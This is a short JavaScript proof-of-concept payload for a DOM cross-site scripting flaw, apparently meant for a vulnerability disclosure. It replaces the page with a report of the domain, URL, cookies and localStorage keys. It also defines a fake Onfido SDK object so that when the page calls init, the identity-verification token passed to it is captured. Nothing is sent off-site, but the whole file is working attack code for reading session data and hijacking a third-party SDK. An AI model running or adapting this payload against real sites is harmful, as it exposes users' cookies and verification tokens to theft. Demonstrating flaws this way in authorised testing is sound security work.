(function() {
  var d = document;
  d.title = "XSS PoC";
  d.body.innerHTML = "";

  var box = d.createElement("div");
  box.style.cssText = "font-family:monospace;max-width:700px;margin:40px auto;padding:30px;border:3px solid #c00;border-radius:8px;background:#fff";

  var info = [
    ["Domain", d.domain],
    ["Origin", location.origin],
    ["URL", location.href],
    ["Cookie", d.cookie || "(empty)"],
    ["localStorage keys", Object.keys(localStorage).join(", ") || "(empty)"]
  ];

  var html = "<h1 style='color:#c00;margin:0 0 20px'>DOM XSS - Proof of Concept</h1>";
  html += "<p>Arbitrary JavaScript executed in the context of <b>" + d.domain + "</b></p>";
  html += "<table style='width:100%;border-collapse:collapse'>";
  info.forEach(function(r) {
    html += "<tr><td style='padding:6px;border:1px solid #ccc;font-weight:bold'>" + r[0] + "</td>";
    html += "<td style='padding:6px;border:1px solid #ccc;word-break:break-all'>" + r[1] + "</td></tr>";
  });
  html += "</table>";

  // Intercept init to capture the SDK token
  html += "<h3 style='margin:20px 0 10px'>SDK Token Interception</h3>";
  html += "<div id='token-output' style='padding:10px;background:#f5f5f5;border:1px solid #ddd;word-break:break-all'>Waiting for SDK init...</div>";

  box.innerHTML = html;
  d.body.appendChild(box);

  // Define fake object to intercept the token
  window.Onfido = {
    init: function(opts) {
      var out = d.getElementById("token-output");
      if (out) {
        out.style.borderColor = "#c00";
        out.innerHTML = "<b>Token intercepted:</b><br>" + (opts.token || "N/A");
      }
      return { tearDown: function() {} };
    }
  };
})();
